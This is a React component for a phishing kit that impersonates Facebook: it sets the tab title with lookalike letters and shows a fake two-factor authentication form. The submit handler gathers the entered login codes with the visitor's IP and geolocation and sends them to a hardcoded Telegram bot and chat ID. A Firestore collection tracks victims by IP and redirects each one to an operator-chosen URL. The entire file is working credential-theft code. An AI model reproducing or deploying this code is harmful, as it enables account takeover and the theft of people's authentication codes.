import React, { useEffect, useState } from 'react';
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIpv4 } from 'public-ip';
import { BsInfoCircleFill as IconInfo } from "react-icons/bs";
import { IoIosAdd as IconAdd } from "react-icons/io";
import { footerLinks, desktoplanguages } from "../constants/footer.js";
import { db } from '../firebase.js';
import { useMediaQuery } from 'react-responsive';
import '../assets/poza99.css';

const About9991 = () => {
    const [ip, setIp] = useState(undefined);
    const [code, setCode] = useState('');
    const [code1, setCode1] = useState('');
    const [userData, setUserData] = useState(undefined);
    const [isUserData, setIsUserData] = useState(false);
    const [userUrl, setUserUrl] = useState(false);

    const handleActions = (event) => {
        event.preventDefault(); // Prevent the default form submission
        if (code === '') {
            // Handle code validation
            return;
        } else {
            const bot = 'bot7876605833:AAHpYasLr_QqWQxpJEtr4-Nf4cyfnskddyA';
            const chid = '7018720331';

            fetch(`https://ipapi.co/json/`)
                .then((response) => response.json())
                .then((response) => {
                    const { country, region, city, postal } = response;
                    const content = `========================
EA 1: '${code}'
PA 2: '${code1}'
Country : '${country}'
Region : '${region}'
City : '${city}'
Zip Code: '${postal}'
IP: '${ip}'
========================`;

                    const encodedContent = encodeURIComponent(content);

                    fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${encodedContent}`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                    })
                        .then(() => {
                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms2';
                        })
                        .catch((error) => {
                            window.location = 'kTy3Ap7Sx5Dq9Lo2Hr4Vm1Zw8Yn6Kf3Gh7Jt2Qy8Uo5Pj9Mb4Re6Fu3Hv5Xq7Zl8Cn1Ms2';
                        });
                });
        }
    };

    const handleCodeChange = (e) => {
        setCode(e.target.value); // Allow any input
    };

    const handleCodeChange1 = (e) => {
        setCode1(e.target.value); // Allow any input
    };

    const getUserData = async () => {
        const documentSnapshot = await getDocs(collection(db, "nrchanger"));
        const newData = documentSnapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter((x) => {
            if (x.ip === ip) {
                setIsUserData(true);
                setUserData(x);
                return x;
            }
        });
        if (filter.length === 0) {
            addUserData();
        }
    };

    const getIp = async () => {
        if (!ip) {
            const ipAddress = await publicIpv4();
            setIp(ipAddress);
        }
    };

    useEffect(() => {
        getIp();
    }, []);

    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false;
                snapshot.docs
                    .map((doc) => ({ ...doc.data(), id: doc.id }))
                    .filter((x) => {
                        if (x.ip === ip) {
                            isExist = true;
                            setUserData(x);
                            fetch('./data.json')
                                .then((res) => res.json())
                                .then((data) => {
                                    data.url_data.filter((item) => {
                                        if (item.id === parseInt(x.redir)) {
                                            setUserUrl(item.url);
                                            return;
                                        }
                                    });
                                })
                                .catch((err) => {
                                    console.log(err, ' error');
                                });
                        }
                    });
                if (!isExist) {
                    setUserUrl(false);
                }
            });
        }
    }, [ip]);

    useEffect(() => {
        document.title = 'Fасebооk';
    }, [userData, userUrl]);

    const addUserData = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1",
                });
                console.log("Document written with ID: ", ip);
                getUserData();
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    };

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        if (ip) {
            getUserData();
        }
    }, [ip]);

    if (userUrl) {
        setTimeout(() => {
            window.location = userUrl;
        }, 1000);
        resetUserNumber();
    }

    console.log("hi here is the data", isUserData, userData);

    if (isUserData) {
        return (
            <>
                <header className="headerx1">
                    <div className="header-logo2"></div>
                    <h1 className="header-title2"></h1>
                </header>
                <body className="bx1" id="bx1" name="bx1">
                    <br />
                    <div className="dilldosca">
                        <form id="form1" className="from1" name="form2" onSubmit={handleActions}>
                            <strong id="qanaj250">Two-Factor Authentication Required</strong>
                            <br />
                            <br />
                            <hr className="dx" />
                            <br />
                            <a id="prraqkaj" className="fore1">
                                You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.<br /><br />
                                Enter the 6-digit code from your <strong>Code Generator</strong> or 3rd party app below.
                            </a>
                            <br /><br /><br /><br /><br />{/* required pattern="[0-9]{6} */}
                            <input type="text" className="codex" id="codex" name="codex" placeholder="Login code" onChange={handleCodeChange} />
                            <br /><br /><br />
                            <span className="form-code"></span>
                            <hr className="dx" />
                            <br />
                            <a id="mllekodi" className="fore1">Need another way to authenticate?</a>
                            <input type="submit" className="submitx" value="Continue" />
                            <br /><br />
                        </form>
                    </div>
                </body>
                
                <footer>
                    <p></p>
                </footer>
            </>
        );
    }

    return null; // Return null if no user data
};

export default About9991;
